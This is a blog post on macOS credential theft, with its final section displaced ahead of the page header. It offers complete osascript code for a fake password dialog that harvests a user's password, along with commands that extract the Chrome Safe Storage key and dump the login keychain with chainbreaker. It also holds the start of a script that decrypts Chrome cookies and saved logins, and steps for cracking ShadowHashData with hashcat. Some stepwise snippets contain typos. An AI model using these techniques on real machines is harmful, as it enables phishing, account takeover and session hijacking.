<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>Get_LocalUser({user<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;bilal&#34;</span>}) <span style="color:#ff79c6">&gt;</span> user_data.json
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -A1 <span style="color:#f1fa8c">&#34;dsAttrTypeNative:ShadowHashData&#34;</span> user_data.json
</span></span></code></pre></div><p>once you collect the base64 blob above, feed it into the command below and decode it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> &lt;blob&gt; | base64 -D &gt; shadowhash.bplist
</span></span></code></pre></div><p>convert the <code>plist</code> to XML.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plutil -convert xml1 shadowhash.bplist
</span></span></code></pre></div><p>we&rsquo;ll need the salt (<code>SALTED-SHA512-PBKDF2</code>) and entropy sections, and in hex, so let&rsquo;s convert them.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> &lt;salt&gt; | base64 -D &gt; salt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xxd -p salt | tr -d <span style="color:#f1fa8c">&#39;\n&#39;</span>
</span></span></code></pre></div><p>now that we have all the parts, create a hash file for cracking. remember the format: <code>$ml$iterations$salt$entropy</code>.</p>
<p>the hashcat command to crack the password is simple, and all you need is a reliable password list (<code>rockyou.txt</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#bd93f9">7100</span> &lt;hash-file&gt; ~/tools/rockyou.txt
</span></span></code></pre></div></main>





<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/minidump-types/" style="float: right"
      >next: advanced evasions, part 2: implementing minidump structures</a
    >
     
    <a class="previous" href="/posts/new_post20/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script><!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="credential access in macOS">

    
        <title>credential access in macOS | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.6f40ec7b8baa6b4858deb6d2433606e0c74c60aa022d42f0d84457862cc005f3.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    credential access in macOS
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 8, 2024 &nbsp;&nbsp; m. jan 29, 2024</span>
      

  </div>
</div>




<main><p>credential management in macOS is not dissimilar to that in Windows, but with some additional quirks. let&rsquo;s take a look at some of the ways they can be accessed, both legitimately and illegitimately.</p>
<h1 id="securityd">securityd</h1>
<p>credentials are managed by the <code>securityd</code> process, and stored in the &ldquo;keychain&rdquo;. <code>securityd</code> is a daemon (i.e. a background process) that maintains different security contexts and handles the various cryptographic operations in macOS. it manages access to the items in the keychain, as well as Security Authorizations.</p>
<p><code>securityd</code> doesn&rsquo;t directly store the date, but it does route all access to keychain items (which is where passwords, encryption keys, and certificates) are all stored. this way, private keys remain out of the user process address space and access to the data is controlled by <code>securityd</code>. the authorization database, located at <code>/etc/authorization</code>, contains the rules that <code>securityd</code> enforces for various operations.</p>
<p>it&rsquo;s important to note that users don&rsquo;t interact directly with <code>securityd</code>. it&rsquo;s also important to note that <code>securityd</code> collaborates with other daemons to maintain the separation and security, like <code>trustd</code> for certificate validation and <code>nsurlsessiond</code> for real-time validity checks.</p>
<p>so, what exactly does it store?</p>
<p>as mentioned earlier, <code>securityd</code> manages access to the keychain, and is reponsible for the keychain&rsquo;s encryption. the keychain (which is implemented as a SQLite database stored on the file system) is encrypted using a <a href="https://support.apple.com/en-ca/guide/security/secb0694df1a/web"  target="_blank" rel="noreferrer nofollow">derived key</a>
. the encryption key for the login keychain is derived from the user&rsquo;s password, and the key for the system keychain is known as a Master Key, which is stored separately from the keychain itself.</p>
<p>basically, <code>securityd</code> doesn&rsquo;t store the PBKDF2 value of the user&rsquo;s password directly, but it does manage a system of derived keys, access controls, and encryption to protect the contents of the keychain. the actual encryption keys are generated as needed and kept secure within the <code>securityd</code> process or hardware security modules.</p>
<p>in the old days [&lt;v10.11], users could obtain task ports for native apps and processes. these task ports would give complete control of the process to whoever was requesting them, and would grant read/write access to process memory. then, SIP was introduced.</p>
<p>SIP (<strong>System Integrity Protection</strong>) was designed to prevent malware from modifying protected files + folders. it protects several key system locations, like <code>/System</code>, <code>/usr</code> (but not <code>/usr/local</code>), <code>/bin</code>, <code>/sbin</code>, <code>/var</code>, and most pre-installed macOS apps. it restricts root access to these protected areas, thereby preventing code injection into system processes. it also limits runtime attachment and <code>DTrace</code> for protected executables, and sanitizes certain environment variables when calling system programs.</p>
<p>SIP is enabled by default, but it can be disabled (or bypassed). to check its status, just type the following into the terminal: <code>csrutil status</code></p>
<p>for (legitimate) app developers, the method to get access to credentials is simple: prompts. however, this method isn&rsquo;t ideal for adversaries because it requires some level of elevated credentials. as always, we might be able to use this to our advantage.</p>
<p><p class="imgp">
  <img loading="lazy" src="image-prompt.png" alt="alt text"  />
</p>
</p>
<h1 id="credential-acces-via-prompts">credential acces via prompts</h1>
<p>users have become increasingly trained to authenticate to any popup on their machine. this leads us to an obvious next-step: create custom popup messages to ask for authentication, and record the credentials entered.</p>
<p>first, set up the scripting environment by initializing <code>osascript</code> with javascript.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>osascript -l JavaScript -i
</span></span></code></pre></div><p>inside the new environment, create an <code>app</code> object that represents the current application and enables standard additions, which allows us to use the dialog functions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> app <span style="color:#ff79c6">=</span> Application.currentApplication()
</span></span><span style="display:flex;"><span>app.includeStandardAdditions <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>
</span></span></code></pre></div><p>now, for the main function. in OSA JavaScript, the <code>run()</code> function is the entry point of the script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> run() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>using shell commands, get the user&rsquo;s full name + username.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> fullName <span style="color:#ff79c6">=</span> app.doShellScript(<span style="color:#f1fa8c">&#39;id -F&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> username <span style="color:#ff79c6">=</span> app.doShellScript(<span style="color:#f1fa8c">&#39;whoami&#39;</span>)
</span></span></code></pre></div><p>define the title, text, default answer, and icon for the dialog. these will be displayed to the user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> title <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Hello </span><span style="color:#f1fa8c">${</span>fullname<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> text <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Hi </span><span style="color:#f1fa8c">${</span>username<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, please enter your password:`</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> answer <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> icon <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;caution&#34;</span>
</span></span></code></pre></div><p>display the dialog, and wrap it in a try-catch block to handle cancellations or errors.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> propmpt <span style="color:#ff79c6">=</span> app.displayDialog(text, {
</span></span><span style="display:flex;"><span>        defaultAnswer<span style="color:#ff79c6">:</span> answer,
</span></span><span style="display:flex;"><span>        buttons<span style="color:#ff79c6">:</span> [<span style="color:#f1fa8c">&#39;OK&#39;</span>, <span style="color:#f1fa8c">&#39;Cancel&#39;</span>],
</span></span><span style="display:flex;"><span>        defaultButton<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>,
</span></span><span style="display:flex;"><span>        cancelButton<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Cancel&#39;</span>,
</span></span><span style="display:flex;"><span>        withTitle<span style="color:#ff79c6">:</span> title,
</span></span><span style="display:flex;"><span>        withIcon<span style="color:#ff79c6">:</span> icon,
</span></span><span style="display:flex;"><span>        hiddenAnswer<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (err){
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// handle errors
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the user should now enter their input (password) and click OK. if they click OK, this next bit will capture their input, display a confirmation, and return the input.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (prompt.buttonReturned <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> userInput <span style="color:#ff79c6">=</span> prompt.textReturned
</span></span><span style="display:flex;"><span>    app.displayAlert(<span style="color:#f1fa8c">`Password entered`</span>, {
</span></span><span style="display:flex;"><span>        message<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>fullName<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, your password has been securely recorded.`</span>,
</span></span><span style="display:flex;"><span>        as<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;informational&#34;</span>
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> userInput
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the next bit is something that should never happen: display the password as a &ldquo;debugging&rdquo; comment.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">null</span>) {
</span></span><span style="display:flex;"><span>    app.displayDialog(<span style="color:#f1fa8c">`Debug: The entered password was &#34;</span><span style="color:#f1fa8c">${</span>result<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;`</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>here it is in action.</p>
<p><p class="imgp">
  <img loading="lazy" src="/credential-prompt.png" alt="prompted"  />
</p>
</p>
<p><p class="imgp">
  <img loading="lazy" src="/credential-recorded.png" alt="recorded"  />
</p>
</p>
<p><p class="imgp">
  <img loading="lazy" src="/credential-revealed.png" alt="revealed"  />
</p>
</p>
<p>here&rsquo;s the full code if you want to try it yourself!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> app <span style="color:#ff79c6">=</span> Application.currentApplication()
</span></span><span style="display:flex;"><span>app.includeStandardAdditions <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> run() {
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Get the current user&#39;s full name
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> fullName <span style="color:#ff79c6">=</span> app.doShellScript(<span style="color:#f1fa8c">&#39;id -F&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Get the current user&#39;s username
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> username <span style="color:#ff79c6">=</span> app.doShellScript(<span style="color:#f1fa8c">&#39;whoami&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> title <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Hello </span><span style="color:#f1fa8c">${</span>fullName<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> text <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Hi </span><span style="color:#f1fa8c">${</span>username<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, please enter your password:`</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> answer <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> icon <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;caution&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">let</span> prompt <span style="color:#ff79c6">=</span> app.displayDialog(text, {
</span></span><span style="display:flex;"><span>            defaultAnswer<span style="color:#ff79c6">:</span> answer,
</span></span><span style="display:flex;"><span>            buttons<span style="color:#ff79c6">:</span> [<span style="color:#f1fa8c">&#39;OK&#39;</span>, <span style="color:#f1fa8c">&#39;Cancel&#39;</span>],
</span></span><span style="display:flex;"><span>            defaultButton<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>,
</span></span><span style="display:flex;"><span>            cancelButton<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Cancel&#39;</span>,
</span></span><span style="display:flex;"><span>            withTitle<span style="color:#ff79c6">:</span> title,
</span></span><span style="display:flex;"><span>            withIcon<span style="color:#ff79c6">:</span> icon,
</span></span><span style="display:flex;"><span>            hiddenAnswer<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (prompt.buttonReturned <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> userInput <span style="color:#ff79c6">=</span> prompt.textReturned
</span></span><span style="display:flex;"><span>            app.displayAlert(<span style="color:#f1fa8c">`Password entered`</span>, {
</span></span><span style="display:flex;"><span>                message<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>fullName<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, your password has been securely recorded.`</span>,
</span></span><span style="display:flex;"><span>                as<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;informational&#34;</span>
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> userInput  <span style="color:#6272a4">// This will be the result of the run() function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (err) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (err.errorNumber <span style="color:#ff79c6">===</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">128</span>) {
</span></span><span style="display:flex;"><span>            app.displayAlert(<span style="color:#f1fa8c">&#34;Dialog cancelled&#34;</span>, {
</span></span><span style="display:flex;"><span>                message<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>fullName<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, you cancelled the password entry.`</span>,
</span></span><span style="display:flex;"><span>                as<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;warning&#34;</span>
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> err
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span>  <span style="color:#6272a4">// Return null if cancelled or an error occurred
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Execute the function and store the result
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">const</span> result <span style="color:#ff79c6">=</span> run()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Display the result (be careful with this in a real scenario!)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">null</span>) {
</span></span><span style="display:flex;"><span>    app.displayDialog(<span style="color:#f1fa8c">`Debug: The entered password was &#34;</span><span style="color:#f1fa8c">${</span>result<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;`</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="credential-access-via-chrome-cookies">credential access via chrome cookies</h1>
<p>browser cookies are a highly valuable vector for attackers. cookies contain session identifiers that allow users to stay logged in, so if an attacker <a href="https://eitca.org/cybersecurity/eitc-is-wasf-web-applications-security-fundamentals/session-attacks/cookie-and-session-attacks/examination-review-cookie-and-session-attacks/how-can-an-attacker-steal-a-users-cookies-using-a-http-get-request-embedded-in-an-image-source/"  target="_blank" rel="noreferrer nofollow">steals them</a>
, they can impersonate the user without needing credentials.</p>
<p>armed with valid session cookes, attackers can also <a href="https://www.techtarget.com/searchsecurity/definition/cookie-poisoning"  target="_blank" rel="noreferrer nofollow">bypass MFA</a>
 because the system assumes the user has already completed the MFA process. let&rsquo;s see how we can steal some cookies!</p>
<p>the &ldquo;big 3&rdquo; browsers store their cookies in different locations.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>safari: ~/Library/Safari/LocalStorage/*
</span></span><span style="display:flex;"><span>firefox: ~/Library/Application Support/Firefox/Profiles/*.default/cookies.sqlite
</span></span><span style="display:flex;"><span>chrome: ~/Library/Application Support/Google/Chrome/Default/Cookies
</span></span></code></pre></div><p>chrome encrypts important user data files (cookies, passwords, payment information, authentication tokens) with a key stored in the user&rsquo;s login keychain. this key is stored under <code>Chrome Safe Storage</code> in the keychain, and is base64 encoded.</p>
<p>to retrieve the key, just use the following command: <code>security find-generic-password -wa &quot;Chrome Safe Storage&quot;</code></p>
<p>this retrieved key can be used directly in the base64-encoded form for decryption operations.</p>
<p>using <a href="https://github.com/n0fate/chainbreaker"  target="_blank" rel="noreferrer nofollow">chainbreaker</a>
, you can extract a bunch of information from your macOS keychain. all you have to do is provide the path to your login keychain (usually at <code>~/Library/Keychains/login.keychain-db</code>), and chainbreaker will output a bunch of decrypted information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m chainbreaker -pa ~/Library/Keychains/login.keychain-db -o output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>grep -C <span style="color:#bd93f9">20</span> <span style="color:#f1fa8c">&#34;Chrome Safe Storage&#34;</span> output.log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Generic Password Record
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Create DateTime: 2023-11-15 18:32:14
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Last Modified DateTime: 2023-11-15 18:32:14
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Description: 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Creator: b<span style="color:#f1fa8c">&#39;aapl&#39;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Type: 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Print Name: b<span style="color:#f1fa8c">&#39;Chrome Safe Storage&#39;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Alias: 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Account: b<span style="color:#f1fa8c">&#39;Chrome&#39;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Service: b<span style="color:#f1fa8c">&#39;Chrome Safe Storage&#39;</span>
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Base64 Encoded Password: b<span style="color:#f1fa8c">&#39;&lt;redacted&gt;&#39;</span>
</span></span></code></pre></div><p>using the base64 safe storage key, and the following script, you can decrypt the cookies + login data, and get a JSON output. you&rsquo;ll need to provide the path to your login data: <code>login_data = ~/Library/Application Support/Google/Chrome/Default/Login Data</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sqlite3
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os.path
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> Crypto.Cipher <span style="color:#ff79c6">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> Crypto.Protocol.KDF <span style="color:#ff79c6">import</span> PBKDF2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>salt <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;saltysalt&#39;</span>
</span></span><span style="display:flex;"><span>cookie_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>login_data <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>chrome_secret <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>iv <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39; &#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">16</span>
</span></span><span style="display:flex;"><span>length <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">chrome_decrypt</span>(encrypted_value, key<span style="color:#ff79c6">=</span><span style="color:#ff79c6">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Encrypted cookies should be prefixed with &#39;v10&#39; according to the</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Chromium code. Strip it off.</span>
</span></span><span style="display:flex;"><span>    encrypted_value <span style="color:#ff79c6">=</span> encrypted_value[<span style="color:#bd93f9">3</span>:]
</span></span><span style="display:flex;"><span>
